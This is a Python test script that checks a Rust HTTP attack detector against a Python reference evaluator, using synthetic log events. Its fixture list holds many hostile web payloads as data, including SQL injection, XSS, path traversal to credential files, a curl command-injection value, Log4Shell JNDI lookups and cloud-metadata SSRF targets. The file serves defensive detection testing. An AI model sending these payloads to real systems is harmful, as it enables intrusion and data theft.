#!/usr/bin/env python3
"""Compare every Rust event finding against the independent Python reference.

Only fictional local fixtures are created. No customer logs or network access.
"""
import argparse
import json
import random
import subprocess
import tempfile
from pathlib import Path
from urllib.parse import quote

from evaluate_catalog import evaluate

ROOT = Path(__file__).resolve().parents[1]


def fixtures():
    expansion = json.loads((ROOT / "tests/fixtures/http-superset-expansion.json").read_text(encoding="utf-8"))
    for case in expansion["rules"]:
        yield from case["positive"]
        yield from case["negative"]
    payloads = [
        "/products?page=2", "/search?q=1 UNION SELECT password", "/?x=@@version",
        "/?x=<script>alert(1)</script>", "/?x=&lt;script&gt;", "/?x=&#60;script&#62;",
        "/?x=&#x3c;script&#x3e;", "/?x=&#60script&#62", "/?x=&ltSCRIPT&gt",
        "/?x=<img onerror=alert(1)>", "/?x=javascript:alert(1)", "/../../etc/passwd",
        "/..\\..\\windows\\win.ini", "/.env", "/.git/config", "/?x=;curl example.invalid",
        "/?x=${jndi:ldap://example.invalid/a}", "/?x=${${lower:j}ndi:ldap://example.invalid/a}",
        "/?x=php://input", "/?x=__proto__", "/?x=rO0AB", "/?x=commonscollections",
        "/?x=commonscollectionſ", "/?x=metadata.google.internal", "/?x=169.254.169.254",
        "/?x={{config}}", "/?x=1+UNION+SELECT+password", "/?x=%00", "/?x=%ff",
        "/_layouts/15/ToolPane.aspx", "/mgmt/tm/util/bash", "/cli?remoting=false",
        "/CFIDE/administrator/", "/setup/SetupWizard.aspx", "/?x=class.module.classloader.a=b",
        "sqlmap/1.0", "nuclEi", "curl", "Mozilla/5.0", "${jndi:ldap://example.invalid/a}",
        "Fatal error: fictional", "you have an error in your SQL syntax", "a\nb", "", "πé", "+%2b",
    ]
    for payload in payloads:
        for variant in [payload, quote(payload, safe=""), quote(quote(payload, safe=""), safe="")]:
            for field in ["clientrequesturi", "clientrequestuseragent", "requestbody", "responsebody"]:
                yield {field: variant}
    for event in [
        {}, {"securityaction": None}, {"securityaction": ""}, {"securityactions": ["BLOCK"]},
        {"requestheaders": {"Content-Length": None, "Transfer-Encoding": "chunked"}},
        {"requestheaders": {"X-Test": "${jndi:ldap://example.invalid/a}"}},
        {"requestheadersraw": ["Content-Length: 0", "content-length: 1"]},
        {"requestheadersraw": ["Set-Cookie: a=1", "set-cookie: b=2"]},
        {"requestheadersraw": ["Accept-Encoding: gzip", "accept-encoding: deflate"]},
        {"requestheadersraw": ["Connection: keep-alive", "CONNECTION: upgrade"]},
        {"requestheadersraw": ["Host: a.example", "host: b.example"]},
        {"requestheadersraw": ["Transfer-Encoding: chunked", "transfer-encoding: identity"]},
        {"requestheaders": {"Transfer-Encoding": "chunked,chunked"}},
        {"clientrequestmethod": "POST", "clientrequesturi": "/_layouts/15/ToolPane.aspx", "clientrequestreferer": "https://example.invalid/_layouts/15/signout.aspx"},
        {"clientrequestmethod": "GET", "clientrequestpath": "/", "edgeresponsestatus": 302, "requestheaders": {"Authorization": "Basic Zm9vOmJhcg=="}, "responseheaders": {"Location": "/cpsess1234567890/"}},
    ]:
        yield event
    rng = random.Random(0x48545450)
    for _ in range(1000):
        uri = "/" + "".join(rng.choice("abcde01234%+&;[](){}$/'\\\"\n\tπſ") for _ in range(rng.randrange(1, 150)))
        yield {"ClientRequestURI": uri, "ClientRequestMethod": rng.choice(["GET", "POST", "TRACE", "CONNECT"]), "EdgeResponseStatus": rng.choice([200, 404, 401]), "ClientRequestUserAgent": rng.choice(payloads)}


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--binary", type=Path, default=ROOT / "target/release/http-detect")
    parser.add_argument("--matcher", choices=["plain", "grouped"], default="grouped")
    args = parser.parse_args()
    catalog = json.loads((ROOT / "rules/http-attacks.json").read_text(encoding="utf-8"))
    events = list(fixtures())
    expected = [{r["id"] for r in evaluate(catalog, e)} for e in events]
    with tempfile.TemporaryDirectory(prefix="http-detect-parity-") as temp:
        path = Path(temp) / "fictional.ndjson"
        path.write_text("".join(json.dumps(e, ensure_ascii=True) + "\n" for e in events))
        command = [str(args.binary), "scan", str(path), "--catalog", str(ROOT / "rules/http-attacks.json"), "--status", "all", "--events-only", "--quiet", "--matcher", args.matcher]
        run = subprocess.run(command, check=True, capture_output=True, text=True, encoding="utf-8")
        actual = [set() for _ in events]
        for line in run.stdout.splitlines():
            hit = json.loads(line)
            assert hit["provenance"] and hit["sources"], "missing attribution"
            actual[hit["details"]["line"] - 1].add(hit["rule_id"])
        mismatches = []
        for n, (wanted, got) in enumerate(zip(expected, actual)):
            if wanted != got:
                mismatches.append({"line": n + 1, "event": events[n], "missing": sorted(wanted - got), "extra": sorted(got - wanted)})
        if mismatches:
            print(json.dumps(mismatches[:20], indent=2))
            raise SystemExit(f"FAIL: {len(mismatches)} mismatches / {len(events)} fixtures")
        print(f"PASS: {len(events)} fixtures; exact event-rule parity; matcher={args.matcher}")


if __name__ == "__main__":
    main()
